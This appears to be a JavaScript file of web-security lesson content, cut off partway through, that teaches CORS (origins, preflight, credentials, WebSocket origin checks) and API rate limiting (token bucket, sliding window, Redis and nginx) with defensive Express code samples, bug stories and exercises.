const concepts = [
  {
    id: 6,
    title: "CORS — Cross-Origin Resource Sharing",
    tag: "WHY YOUR BROWSER SAYS NO",
    color: "#0891B2",
    tldr: `CORS is a browser security mechanism that restricts web pages from making requests to a different origin (domain, protocol, or port) than the one that served the page. It is enforced entirely by the browser — not the server, not the network. Understanding preflight mechanics, credentials, and wildcard restrictions explains nearly every "blocked by CORS policy" error engineers encounter.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"Access to fetch at 'https://api.example.com' from origin 'https://app.example.com' 
 has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present"

This error confuses engineers because:
  1. They think CORS is a server-side problem — it's browser-enforced, curl/Postman never see it
  2. They add Access-Control-Allow-Origin: * then wonder why cookies stopped working
  3. They don't understand WHY preflight OPTIONS requests are sent (and when they aren't)
  4. They allow all origins in production to "fix" CORS — massive security hole
  5. They confuse CORS with authentication — CORS is about BROWSER POLICY, not access control
  6. WebSocket upgrades and CORS interact differently — common source of bugs
  7. Multi-tenant SaaS: each tenant has a different subdomain — dynamic origin whitelisting needed

The real danger: misconfigured CORS (Allow-Origin: * with credentials) lets any malicious
website make authenticated requests to your API using a victim's cookies.
CORS is the browser's defence against this — it must be configured correctly.
    `,
    analogy: `
THE NIGHTCLUB BOUNCER ANALOGY:
-------------------------------
CORS is the bouncer at a nightclub. The club is your API server. 
The guests are JavaScript code from different websites.

SAME-ORIGIN (No bouncer needed):
  Your React app at app.razorpay.com calls api.razorpay.com
  Wait — different subdomain = different origin? YES.
  Origin = protocol + hostname + port. app.razorpay.com ≠ api.razorpay.com.

THE BOUNCER'S JOB (Browser enforces CORS):
  JavaScript at evil.com tries to call api.yourbank.com/transfer?to=attacker&amount=50000
  The BROWSER (bouncer) asks api.yourbank.com: "Do you allow guests from evil.com?"
  If the server doesn't say yes → browser blocks the response (request may have been made!)

SIMPLE vs PREFLIGHT REQUESTS:
  SIMPLE REQUEST (no bouncer check upfront — just politely ask after):
    Like walking in and ordering a drink. Bouncer checks AFTER you're inside.
    Criteria: GET/POST/HEAD with basic headers and basic Content-Type (form, text, multipart)
    Browser sends request → if no CORS headers in response → browser hides the response from JS
    
  PREFLIGHT (bouncer checks BEFORE you enter):
    You're a VIP trying to enter with a weapon scanner (custom headers, JSON body, DELETE method)
    Bouncer sends a scout first (OPTIONS request): "Can a guest from app.example.com enter with 
    Authorization and Content-Type: application/json headers?"
    Server must respond to OPTIONS: "Yes, those guests and headers are allowed"
    THEN the real request is sent.

CREDENTIALS RULE (most confusing):
  Wildcard * pass = anonymous entry (no credentials, cookies, or tokens)
  VIP pass (specific origin) = allows credentials
  You CANNOT say "all guests allowed" AND "VIP credentials allowed" simultaneously.
  Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true = REJECTED by browser.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — CORS INTERNALS:
--------------------------------------------

WHAT IS AN "ORIGIN"?
  Origin = scheme + host + port
  https://app.example.com:443 ← scheme=https, host=app.example.com, port=443
  
  Different origin examples:
    https://app.example.com  →  https://api.example.com    (different subdomain)
    https://example.com      →  http://example.com         (different scheme)
    https://example.com      →  https://example.com:8080   (different port)
  
  Same origin: https://example.com/page1 → https://example.com/api (same scheme+host+port)

SIMPLE REQUESTS (no preflight):
  All of these must be true:
  - Method: GET, POST, or HEAD
  - Headers: only CORS-safelisted headers:
    Accept, Accept-Language, Content-Language, Content-Type (with restrictions),
    Range (within limits)
  - Content-Type (if POST): only:
    application/x-www-form-urlencoded
    multipart/form-data
    text/plain
  
  For simple requests: browser sends request WITH Origin header, checks response headers.
  Server response must include: Access-Control-Allow-Origin: <origin> or *
  If missing or mismatched → browser hides response from JavaScript (request reached server!)
  
  IMPORTANT: Simple requests always reach the server — CORS only hides the RESPONSE.

PREFLIGHT REQUESTS (OPTIONS):
  Triggered when ANY of these are true:
  - Method is not GET/POST/HEAD (PUT, DELETE, PATCH, etc.)
  - Custom headers present (Authorization, X-API-Key, X-Request-ID, etc.)
  - Content-Type is application/json, application/xml, etc.
  
  Preflight OPTIONS request headers:
    Origin: https://app.example.com
    Access-Control-Request-Method: DELETE
    Access-Control-Request-Headers: Authorization, Content-Type
  
  Server must respond:
    Access-Control-Allow-Origin: https://app.example.com
    Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
    Access-Control-Allow-Headers: Authorization, Content-Type, X-API-Key
    Access-Control-Max-Age: 86400  ← Cache preflight for 24h (avoid repeated OPTIONS)
    Access-Control-Allow-Credentials: true  ← only if credentials needed
  
  After successful preflight → real request sent → response checked again.

CORS HEADERS REFERENCE:
  Request headers (browser sends):
    Origin: <origin>                         Always sent for cross-origin requests
    Access-Control-Request-Method: <method>  Preflight only
    Access-Control-Request-Headers: <list>   Preflight only
  
  Response headers (server sends):
    Access-Control-Allow-Origin: <origin>|*
    Access-Control-Allow-Methods: <list>
    Access-Control-Allow-Headers: <list>
    Access-Control-Allow-Credentials: true
    Access-Control-Max-Age: <seconds>        Cache preflight duration
    Access-Control-Expose-Headers: <list>    Which response headers JS can read
                                             (by default, only basic headers exposed)
    Vary: Origin                             CRITICAL — tells CDN/cache to vary response by origin

CREDENTIALS AND WILDCARD RESTRICTION:
  When request includes credentials (cookies, Authorization header, TLS client certs):
  fetch(url, { credentials: 'include' })
  
  Server MUST:
    Access-Control-Allow-Origin: https://specific-origin.com  (NOT *)
    Access-Control-Allow-Credentials: true
  
  If server returns * with credentials → browser REJECTS the response.
  
  Why? If * allowed with credentials, evil.com could make authenticated requests
  using a victim's cookies to any API that allows all origins.

DYNAMIC ORIGIN WHITELISTING (multi-tenant SaaS):
  Problem: You have 1000 customers each with their own subdomain (tenant1.saas.com)
  Solution: Maintain a whitelist, dynamically set Access-Control-Allow-Origin per request
  
  MUST also set: Vary: Origin
  Why Vary: Origin? If a CDN caches the response for tenant1.saas.com with that origin,
  and tenant2.saas.com gets the cached response → tenant2 sees wrong CORS header.
  Vary: Origin tells CDN to cache separately per origin value.

WEBSOCKET AND CORS:
  WebSocket protocol (ws:// wss://) does NOT use CORS!
  Browser sends WebSocket upgrade with Origin header, but:
  - There is NO preflight for WebSocket
  - Browser does NOT enforce CORS headers for WebSocket
  - Server is responsible for checking Origin header and rejecting bad origins
  
  This means: if your WebSocket server doesn't check Origin → any website can connect!

NULL ORIGIN:
  Some requests have Origin: null:
    - file:// URLs
    - sandboxed iframes
    - Some redirects
  Never whitelist null origin — attackers can craft requests with null origin.
  Access-Control-Allow-Origin: null is equivalent to allowing any sandboxed attacker.

CORS IS NOT AUTHENTICATION:
  CORS only controls browser behavior.
  Server-to-server calls: curl, Postman, backend services — NO CORS enforcement!
  A malicious server can still call your API — CORS only stops browser-based attacks.
  For actual access control: use authentication (JWT, API keys, mTLS).
    `,
    code: `
// ===== CORS — CODE EXAMPLES =====

// EXAMPLE 1: Basic CORS middleware (Express.js)
// Simple but insecure — shows the concepts
const express = require('express');
const app = express();

// BAD: Allow all origins with credentials (browser will reject!)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');           // Wildcard
  res.setHeader('Access-Control-Allow-Credentials', 'true');  // Credentials
  // Browser REJECTS responses with both * and credentials!
  next();
});

// GOOD: Correct CORS middleware for a known single origin
app.use((req, res, next) => {
  const allowedOrigin = 'https://app.mycompany.com';
  
  if (req.headers.origin === allowedOrigin) {
    res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin'); // Important for caching
  }
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type, X-Request-ID');
    res.setHeader('Access-Control-Max-Age', '86400'); // Cache preflight 24h
    return res.status(204).end(); // No content for preflight
  }
  
  next();
});

// EXAMPLE 2: Dynamic origin whitelisting for multi-tenant SaaS
// Scenario: Priya's B2B SaaS has tenants like hdfc.saas.com, icici.saas.com
const ALLOWED_ORIGINS = new Set([
  'https://hdfc.saas.com',
  'https://icici.saas.com',
  'https://axis.saas.com',
  'https://app.saas.com', // Main app
]);

// Also allow *.saas.com subdomains dynamically:
function isAllowedOrigin(origin) {
  if (!origin) return false;
  if (ALLOWED_ORIGINS.has(origin)) return true;
  
  // Allow *.saas.com subdomains (validate carefully!)
  try {
    const url = new URL(origin);
    return url.protocol === 'https:' && 
           url.hostname.endsWith('.saas.com') &&
           !url.hostname.includes('..') && // No path traversal via subdomains
           url.hostname.split('.').length === 3; // exactly subdomain.saas.com
  } catch {
    return false;
  }
}

function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;
  
  if (isAllowedOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin); // Reflect validated origin
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin'); // CRITICAL: tell CDN to vary by origin
  }
  // If origin not allowed: don't set headers → browser blocks the response
  
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 
      'Authorization, Content-Type, X-Tenant-ID, X-Request-ID');
    res.setHeader('Access-Control-Max-Age', '3600');
    res.setHeader('Access-Control-Expose-Headers', 'X-RateLimit-Remaining, X-Request-ID');
    return res.status(204).end();
  }
  
  next();
}

app.use(corsMiddleware);

// EXAMPLE 3: WebSocket origin validation (CORS doesn't apply — must do manually!)
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 8080, 
  // WebSocket server-side origin check:
  verifyClient: (info, callback) => {
    const origin = info.origin;
    
    if (!isAllowedOrigin(origin)) {
      console.warn(\`WebSocket connection rejected from origin: \${origin}\`);
      callback(false, 403, 'Forbidden: Origin not allowed');
      return;
    }
    
    console.log(\`WebSocket connection accepted from: \${origin}\`);
    callback(true); // Allow connection
  }
});

wss.on('connection', (ws, req) => {
  // Additional auth: validate JWT from query param or first message
  const url = new URL(req.url, 'http://localhost');
  const token = url.searchParams.get('token');
  
  if (!validateJWT(token)) {
    ws.close(1008, 'Unauthorized'); // 1008 = Policy Violation close code
    return;
  }
  
  ws.on('message', (data) => {
    ws.send(\`Echo: \${data}\`);
  });
});

function validateJWT(token) {
  // JWT validation logic (see Concept 10)
  return !!token; // Simplified
}

// EXAMPLE 4: Using the 'cors' npm package correctly
// // const cors = require('cors'); // npm install cors

const corsOptions = {
  origin: (origin, callback) => {
    // Allow requests with no origin (server-to-server, curl, mobile apps)
    if (!origin) return callback(null, true);
    
    if (isAllowedOrigin(origin)) {
      callback(null, origin); // Reflect the specific allowed origin (not true/*)
    } else {
      callback(new Error(\`CORS: Origin \${origin} not allowed\`));
    }
  },
  credentials: true,                    // Allow cookies and Authorization headers
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Authorization', 'Content-Type', 'X-Request-ID'],
  exposedHeaders: ['X-RateLimit-Remaining', 'X-Total-Count'],
  maxAge: 86400,                        // Preflight cache: 24 hours
  optionsSuccessStatus: 204,            // Some browsers choke on 200 for OPTIONS
};

// app.use(cors(corsOptions)); // Apply globally
// app.options('*', cors(corsOptions)); // Explicitly handle all preflight requests

// EXAMPLE 5: Testing CORS from the client side
async function testCorsRequest() {
  // Simple request (no preflight — GET with no custom headers):
  const simpleRes = await fetch('https://api.example.com/public/data');
  // Browser sends: GET /public/data + Origin: https://yourapp.com
  // Browser checks response for Access-Control-Allow-Origin header
  
  // Preflighted request (triggers OPTIONS first):
  const preflightedRes = await fetch('https://api.example.com/users', {
    method: 'DELETE',                           // Non-simple method → preflight
    headers: {
      'Authorization': 'Bearer eyJhbGc...',     // Custom header → preflight
      'Content-Type': 'application/json',       // Non-simple content type → preflight
    },
    credentials: 'include',                     // Send cookies → requires specific origin (not *)
  });
  
  // Handling CORS errors gracefully:
  try {
    const res = await fetch('https://api.example.com/data');
    const data = await res.json();
    return data;
  } catch (err) {
    if (err instanceof TypeError && err.message === 'Failed to fetch') {
      // CORS error shows as generic TypeError — browser hides details for security
      console.error('Possible CORS error or network failure');
      // Check browser DevTools → Network → look for CORS error in Console
    }
    throw err;
  }
}

// EXAMPLE 6: CORS in Next.js API routes (common pattern)
// // next.config.js or in API route handler:
function nextjsCorsHandler(req, res) {
  const origin = req.headers.origin;
  
  if (isAllowedOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
    res.setHeader('Access-Control-Max-Age', '86400');
    res.status(204).end();
    return true; // Caller should return if true
  }
  return false;
}

// In API route:
// export default function handler(req, res) {
//   if (nextjsCorsHandler(req, res)) return; // Preflight handled
//   // ... actual logic
// }

// EXAMPLE 7: Logging and monitoring CORS violations (security insight)
function corsViolationLogger(req, res, next) {
  const origin = req.headers.origin;
  const method = req.method;
  
  // Log all cross-origin requests for security auditing
  if (origin && origin !== \`\${req.protocol}://\${req.hostname}\`) {
    const allowed = isAllowedOrigin(origin);
    
    console.log(JSON.stringify({
      event: 'cors_request',
      origin,
      method,
      path: req.path,
      allowed,
      ip: req.ip,
      timestamp: new Date().toISOString(),
    }));
    
    if (!allowed) {
      // Don't block — CORS lets browser do that. But log for security awareness.
      // (Server can also explicitly block if you want defence-in-depth)
      console.warn(\`CORS: Rejected origin \${origin} tried to access \${req.path}\`);
    }
  }
  
  next();
}
    `,
    bugs: `
REAL PRODUCTION BUGS FROM CORS MISUNDERSTANDING:
-------------------------------------------------

BUG 1: Access-Control-Allow-Origin: * with credentials — silent failure
  Scenario: Vikram added * to allow all origins, and credentials: true for cookies.
    Browser silently rejected ALL responses. No error message in UI — just blank data.
  Root cause: Browser spec: wildcard + credentials = rejected. No exception.
    Chrome DevTools Console: "Cannot use wildcard in Access-Control-Allow-Origin when
    credentials flag is true"
  Fix: Replace * with the specific allowed origin(s). If multiple, use dynamic validation.
  Detection: Open DevTools → Console → look for CORS error messages (they're specific!)

BUG 2: Missing Vary: Origin header causing CDN to serve wrong CORS response
  Scenario: tenant1.saas.com worked fine. tenant2.saas.com got CORS errors intermittently.
    Happened only after high traffic from tenant1 (cache warming).
  Root cause: CloudFront cached response for tenant1 with:
    Access-Control-Allow-Origin: https://tenant1.saas.com
    But no Vary: Origin header → CloudFront cached this response as universal
    tenant2's request hit the cache → got tenant1's CORS header → browser rejected it
  Fix: Add Vary: Origin to ALL CORS responses. CloudFront will cache per-origin.
    Also configure CloudFront to forward Origin header and cache based on it.

BUG 3: OPTIONS preflight failing silently due to missing response
  Scenario: POST /api/transfer worked from Postman but failed from browser.
    Network tab showed OPTIONS request returning 404.
  Root cause: Express router had routes for POST but not for OPTIONS method.
    Without handling OPTIONS, server returned 404 → browser interpreted as CORS failure.
  Fix: 
    app.options('*', corsMiddleware); // Handle OPTIONS before other routes
    // Or use the cors package which handles this automatically

BUG 4: WebSocket origin not validated — any website could connect
  Scenario: Security audit found that evil.com could open WebSocket to chat.myapp.com
    and read/send messages on behalf of authenticated users (cookies sent automatically!)
  Root cause: WebSocket server had no origin check. Browser sends cookies with WebSocket
    upgrade if on same-site. Any origin can initiate the connection — browser doesn't block.
  Fix: Always implement verifyClient with origin whitelist in ws/socket.io:
    // socket.io:
    // const io = new Server(server, {
    //   cors: { origin: isAllowedOrigin, credentials: true }
    // });

BUG 5: CORS error masking actual 500 server error
  Scenario: API started returning 500 errors. But frontend team reported "CORS errors".
  Root cause: Server error handler was not setting CORS headers before returning 500.
    Browser saw response without CORS headers → reported CORS error in console.
    Actual problem: database connection failure (500 error hidden by CORS mismatch in error path).
  Fix: Apply CORS middleware BEFORE all other middleware including error handlers.
    In Express: app.use(corsMiddleware) must be FIRST.
    Ensure error-handling middleware also sets CORS headers:
    app.use((err, req, res, next) => {
      if (isAllowedOrigin(req.headers.origin)) {
        res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
      }
      res.status(500).json({ error: err.message });
    });
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE OUTCOME:
  For each request, will the browser block it? What CORS headers are needed?
  
  a) fetch('https://api.example.com/data') called from https://app.example.com
     (GET, no custom headers, no credentials)
     Is this a simple or preflighted request? ______
     What header must server return? ______
  
  b) fetch('https://api.example.com/transfer', { method: 'POST', 
     headers: { 'Authorization': 'Bearer xyz', 'Content-Type': 'application/json' },
     credentials: 'include' })
     Is this a simple or preflighted request? ______
     What response to OPTIONS must server return? ______
     Can server return Access-Control-Allow-Origin: * ? ______
  
  c) new WebSocket('wss://ws.example.com/live') from https://evil.com
     Does browser enforce CORS? ______
     What must server check? ______

CHALLENGE 2 — FIX THE MIDDLEWARE:
  This CORS middleware has 4 bugs. Find and fix them:
  
  app.use((req, res, next) => {
    // Bug 1: Wildcard with credentials
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    if (req.method === 'OPTIONS') {
      res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
      // Bug 2: Missing allowed headers (Authorization will be blocked)
      // Bug 3: Missing Max-Age (browser preflights on every request)
      return res.status(200).end(); // Bug 4: Should be 204, some browsers mishandle 200
    }
    next();
  });
  // Bug 5 (bonus): Missing Vary: Origin header

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a production-grade CORS middleware for a multi-tenant SaaS platform:
  
  Requirements:
  1. Allow origins from a configurable whitelist (loaded from database/config)
  2. Allow *.tenants.saas.com subdomains dynamically (validated, not regex injection risk)
  3. Refresh the whitelist every 5 minutes (tenants can be added/removed)
  4. Set all required CORS headers correctly (Allow-Origin, Methods, Headers, Credentials, Vary)
  5. Log all cross-origin requests to an audit log (origin, method, path, allowed/blocked)
  6. Block null origin explicitly
  7. Handle preflight OPTIONS correctly with 24h cache
  8. Expose X-RateLimit-Remaining and X-Request-ID to browser JavaScript
  9. Apply different CORS rules for public API vs admin API routes
  10. Write tests that verify: allowed origin works, blocked origin is rejected,
      credentials + wildcard correctly rejected, Vary header always present
    `,
    summary: `CORS is a browser security mechanism — not a server feature. The browser enforces it; curl and backend services ignore it entirely. The golden rules: never use wildcard (*) with credentials, always set Vary: Origin when reflecting origins dynamically, always handle OPTIONS preflight explicitly, and always validate WebSocket Origin headers manually since the browser won't do it for you.`
  },

  {
    id: 7,
    title: "Rate Limiting — Token Bucket, Sliding Window & Layered Defense",
    tag: "KEEPING YOUR API ALIVE UNDER FIRE",
    color: "#BE185D",
    tldr: `Rate limiting protects APIs from abuse, DoS attacks, and runaway clients by capping how many requests a client can make in a time window. The two dominant algorithms are token bucket (allows short bursts, smooth average) and sliding window (strict per-window counting). Production systems layer nginx rate limiting (network-level) with application-level rate limiting (per-user, per-endpoint logic) for defense in depth.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
Without rate limiting:
  - One bad actor can bring down your API for everyone (DoS)
  - Scrapers can extract your entire database in hours
  - A bug in a client can hammer your API with infinite retries
  - Payment APIs can be probed with millions of card numbers (credential stuffing)

Confusion engineers face:
  1. "Token bucket allows bursts — how does that help if attacker sends burst?"
     → Burst capacity is limited; sustained attack still gets throttled
  2. "Why is sliding window more accurate than fixed window?"
     → Fixed window resets at boundary — attacker sends 2× rate around reset
  3. "nginx rate limit vs application rate limit — do I need both?"
     → Yes: nginx stops volumetric attacks at network layer; app-level does per-user logic
  4. "What do I return when rate limited? What headers?"
     → 429 Too Many Requests + Retry-After + X-RateLimit-* headers
  5. "How do I rate limit across multiple instances of my app?"
     → Shared state (Redis) required — per-instance counting is wrong
    `,
    analogy: `
THE TOKEN BUCKET — TOLLBOOTH WITH TOKENS:
------------------------------------------
Imagine a tollbooth that uses poker chips (tokens).

TOKEN BUCKET ALGORITHM:
  - The bucket holds a maximum of 10 chips (burst capacity)
  - Every second, 2 chips are added (refill rate = 2/second)
  - To make an API call, you spend 1 chip
  - No chips = rejected (rate limited, 429)
  
  Normal user (makes 1 req/s): always has chips, never limited ✅
  Burst user (10 req at once): spends all 10 chips, then waits 5s for refill 🟡
  Attacker (1000 req/s): uses 10 chips immediately, then gets 2/s → 99.8% rejected ❌

SLIDING WINDOW — THE ROLLING 60-SECOND MEMORY:
  Instead of tokens, the bouncer remembers EVERY request with a timestamp.
  "In the last 60 seconds: you made 47 requests. Limit is 50. You have 3 remaining."
  As old requests age out of the window, capacity comes back gradually.
  
  vs FIXED WINDOW (less accurate):
  Fixed window resets at :00, :60. Attack pattern:
    50 requests at :59 → window resets at :00 → 50 more at :00:01
    = 100 requests in 2 seconds using a "50/minute" limit!
  Sliding window closes this gap.

LAYERED DEFENSE (nginx + app):
  nginx (gate):    "No single IP can make more than 100 req/second" 
                   (protects server from being overwhelmed before app even runs)
  App (doorman):   "User priya@example.com can make 1000 req/day to /api/search
                   but only 10/minute to /api/payment" 
                   (fine-grained business logic that nginx can't do)
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — RATE LIMITING ALGORITHMS:
------------------------------------------------------

TOKEN BUCKET ALGORITHM:
  State: { tokens: float, lastRefill: timestamp }
  
  On each request:
    1. elapsed = now - lastRefill
    2. tokens = min(capacity, tokens + elapsed × refillRate)
    3. lastRefill = now
    4. if tokens >= cost: tokens -= cost; allow
    5. else: reject (429)
  
  Properties:
    - Allows bursts up to capacity size
    - Smooth average rate = refillRate
    - Mathematically simple and efficient (O(1) state per client)
    - Good for: APIs where occasional bursts are acceptable (mobile apps, dashboards)
  
  Variants:
    - Leaky Bucket: requests join a queue, processed at fixed rate (no bursts, constant output)
      Used for: outbound rate limiting (don't overwhelm downstream service)
    - Token Bucket: allows bursts, limits average (inbound rate limiting)

FIXED WINDOW COUNTER:
  State: { count: int, windowStart: timestamp }
  
  On each request:
    1. if now > windowStart + windowSize: count = 0; windowStart = now (reset)
    2. if count < limit: count++; allow
    3. else: reject
  
  Problem: boundary attack — 2× rate possible at window boundary
  Simple to implement, fine for non-critical limits

SLIDING WINDOW LOG:
  State: sorted list of timestamps for this client
  
  On each request:
    1. Remove timestamps older than now - windowSize
    2. if len(timestamps) < limit: add now; allow
    3. else: reject
  
  Perfectly accurate, but O(limit) memory per client — expensive at scale

SLIDING WINDOW COUNTER (approximation, used at scale):
  State: { prevCount: int, currCount: int, windowStart: timestamp }
  
  On each request:
    1. if now > windowStart + windowSize: prevCount = currCount; currCount = 0; windowStart = now
    2. elapsed = now - windowStart
    3. estimatedCount = prevCount × (1 - elapsed/windowSize) + currCount
       (interpolates previous window count based on how far we are through current window)
    4. if estimatedCount < limit: currCount++; allow
    5. else: reject
  
  O(1) state, very accurate (within 0.5% of sliding window log in practice)
  Used by: Cloudflare, Redis rate limiting libraries

REDIS-BASED SLIDING WINDOW (distributed, multi-instance):
  Uses Redis sorted sets (ZSET) to store request timestamps:
  Key: \`rate:\${userId}:\${endpoint}\`
  Score: timestamp (epoch milliseconds)
  Member: unique request ID
  
  Lua script (atomic operation — no race conditions):
    MULTI:
      ZREMRANGEBYSCORE key 0 (now - window)  -- Remove old entries
      ZCARD key                               -- Count current entries
      ZADD key now requestId                  -- Add this request
      EXPIRE key window                       -- TTL cleanup
    EXEC
  
  If count < limit → allowed; else → rejected
  All in one atomic Lua script → no race condition between check and increment

NGINX RATE LIMITING:
  Module: ngx_http_limit_req_module
  
  Configuration:
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    # Zone: "api", 10MB memory (stores ~160k IPs), rate: 10 req/second per IP
    
    server {
      location /api/ {
        limit_req zone=api burst=20 nodelay;
        # burst=20: allow up to 20 extra requests before rejection (token bucket!)
        # nodelay: don't queue bursts, serve them immediately (up to burst limit)
        # Without nodelay: excess burst requests are queued (adds latency)
      }
    }
  
  nginx uses leaky bucket internally (despite "limit_req" name, burst is bucket)
  
  Two-level nginx limiting:
    limit_req_zone $binary_remote_addr zone=per_ip:10m rate=100r/s;   // Per IP
    limit_req_zone $http_authorization zone=per_token:10m rate=1000r/m; // Per auth token
    
  nginx returns 503 by default for rate limited requests — change to 429:
    limit_req_status 429;

RATE LIMIT HEADERS (IETF RFC 6585, draft-ietf-httpapi-ratelimit-headers):
  X-RateLimit-Limit: 100          Maximum requests allowed in window
  X-RateLimit-Remaining: 37       Requests remaining in current window
  X-RateLimit-Reset: 1703145600   Unix timestamp when window resets (or seconds until reset)
  Retry-After: 30                 Seconds until client should retry (on 429)
  
  Newer RFC draft standardizes:
  RateLimit-Limit: 100
  RateLimit-Remaining: 37
  RateLimit-Reset: 30             (seconds until reset in new standard)

RATE LIMIT BY WHAT? (key selection):
  By IP:         default, easy, bypassed by distributed attack / shared IPs (CDN, NAT)
  By User ID:    after auth, per-user limits, need auth middleware first
  By API Key:    for third-party integrations, granular per-key limits
  By IP + Path:  different limits for /api/search vs /api/payment
  By tenant:     SaaS — each org gets its own quota (fair use across tenants)
  
  Real systems combine: IP limit (unauthenticated) + user limit (authenticated)
    `,
    code: `
// ===== RATE LIMITING — CODE EXAMPLES =====

// EXAMPLE 1: Token Bucket implementation (pure JavaScript, in-memory)
class TokenBucket {
  constructor(capacity, refillRate) {
    this.capacity = capacity;      // Max tokens (burst size)
    this.refillRate = refillRate;  // Tokens added per millisecond
    this.tokens = capacity;        // Start full
    this.lastRefill = Date.now();
  }
  
  consume(cost = 1) {
    this.refill();
    if (this.tokens >= cost) {
      this.tokens -= cost;
      return { allowed: true, remaining: Math.floor(this.tokens) };
    }
    const waitMs = Math.ceil((cost - this.tokens) / this.refillRate);
    return { allowed: false, retryAfterMs: waitMs, remaining: 0 };
  }
  
  refill() {
    const now = Date.now();
    const elapsed = now - this.lastRefill;
    this.tokens = Math.min(this.capacity, this.tokens + elapsed * this.refillRate);
    this.lastRefill = now;
  }
}

// Usage: 10 requests/second, burst of 50
const paymentRateLimiter = new TokenBucket(50, 10 / 1000); // 10 tokens per second

// In Express middleware:
const buckets = new Map(); // userId → TokenBucket
function tokenBucketMiddleware(req, res, next) {
  const userId = req.user?.id || req.ip;
  if (!buckets.has(userId)) {
    buckets.set(userId, new TokenBucket(50, 10 / 1000));
  }
  
  const result = buckets.get(userId).consume();
  res.setHeader('X-RateLimit-Remaining', result.remaining);
  res.setHeader('X-RateLimit-Limit', 50);
  
  if (!result.allowed) {
    res.setHeader('Retry-After', Math.ceil(result.retryAfterMs / 1000));
    return res.status(429).json({
      error: 'Too Many Requests',
      retryAfter: Math.ceil(result.retryAfterMs / 1000),
      message: \`Rate limit exceeded. Retry in \${Math.ceil(result.retryAfterMs / 1000)}s\`,
    });
  }
  next();
}

// EXAMPLE 2: Sliding Window Counter with Redis (distributed, production-grade)
// // const redis = require('ioredis');
// const redisClient = new redis({ host: 'redis.internal', port: 6379 });

// Lua script for atomic sliding window check-and-increment:
const SLIDING_WINDOW_SCRIPT = \`
local key = KEYS[1]
local window = tonumber(ARGV[1])   -- window size in milliseconds
local limit = tonumber(ARGV[2])    -- max requests
local now = tonumber(ARGV[3])      -- current timestamp in ms
local requestId = ARGV[4]          -- unique request ID

-- Remove entries outside the window
redis.call('ZREMRANGEBYSCORE', key, 0, now - window)

-- Count current entries in window
local count = redis.call('ZCARD', key)

if count < limit then
  -- Add this request
  redis.call('ZADD', key, now, requestId)
  redis.call('PEXPIRE', key, window)
  return {1, limit - count - 1}  -- allowed, remaining
else
  -- Get oldest entry to compute retry-after
  local oldest = redis.call('ZRANGE', key, 0, 0, 'WITHSCORES')
  local retryAfter = 0
  if oldest[2] then
    retryAfter = math.ceil((oldest[2] + window - now) / 1000)
  end
  return {0, 0, retryAfter}  -- blocked, remaining, retry-after seconds
end
\`;

async function slidingWindowRateLimit(redisClient, userId, endpoint, limit, windowMs) {
  const key = \`rate:\${userId}:\${endpoint}\`;
  const now = Date.now();
  const requestId = \`\${now}:\${Math.random().toString(36).slice(2)}\`;
  
  const result = await redisClient.eval(
    SLIDING_WINDOW_SCRIPT,
    1,          // number of keys
    key,        // KEYS[1]
    windowMs,   // ARGV[1]
    limit,      // ARGV[2]
    now,        // ARGV[3]
    requestId   // ARGV[4]
  );
  
  return {
    allowed: result[0] === 1,
    remaining: result[1],
    retryAfter: result[2] || 0,
    limit,
    window: windowMs / 1000,
  };
}

// EXAMPLE 3: Multi-tier rate limiting middleware (IP + User)
async function multiTierRateLimitMiddleware(req, res, next) {
  const redisClient = req.app.get('redis');
  const ip = req.ip;
  const userId = req.user?.id;
  const endpoint = req.path.replace(/\\/[0-9a-f-]+/gi, '/:id'); // Normalize paths
  
  // Tier 1: IP-based limit (unauthenticated defense)
  const ipLimit = await slidingWindowRateLimit(
    redisClient, \`ip:\${ip}\`, 'global', 200, 60000 // 200/minute per IP
  );
  
  if (!ipLimit.allowed) {
    res.setHeader('X-RateLimit-Limit', ipLimit.limit);
    res.setHeader('X-RateLimit-Remaining', 0);
    res.setHeader('Retry-After', ipLimit.retryAfter);
    return res.status(429).json({ error: 'IP rate limit exceeded', retryAfter: ipLimit.retryAfter });
  }
  
  // Tier 2: User-based limit (if authenticated)
  if (userId) {
    // Different limits for different endpoints:
    const endpointLimits = {
      '/api/payment':   { limit: 10,   window: 60000  },  // 10/minute
      '/api/search':    { limit: 100,  window: 60000  },  // 100/minute
      '/api/export':    { limit: 5,    window: 3600000 }, // 5/hour
      default:          { limit: 1000, window: 3600000 }, // 1000/hour
    };
    
    const { limit, window } = endpointLimits[endpoint] || endpointLimits.default;
